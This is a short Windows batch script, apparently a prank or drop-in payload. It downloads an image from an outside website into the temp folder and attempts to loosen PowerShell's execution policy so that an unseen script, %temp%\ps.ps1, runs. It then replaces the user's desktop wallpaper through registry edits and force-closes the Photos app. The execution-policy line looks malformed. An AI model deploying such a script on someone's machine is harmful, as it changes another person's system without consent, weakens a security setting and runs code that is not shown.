powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_21693.jpg -OutFile %temp%\hatter.jpg"
timeout 1
Powershell.exe set-executionpolicy remotesigned -File  %temp%\ps.ps1
timeout 1
start %temp%\open.png
timeout 1
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /f /d %temp%\hatter.jpg
reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
rundll32.exe user32.dll, UpdatePerUserSystemParameters
timeout 3
taskkill /IM Microsoft.Photos.exe /f
exit
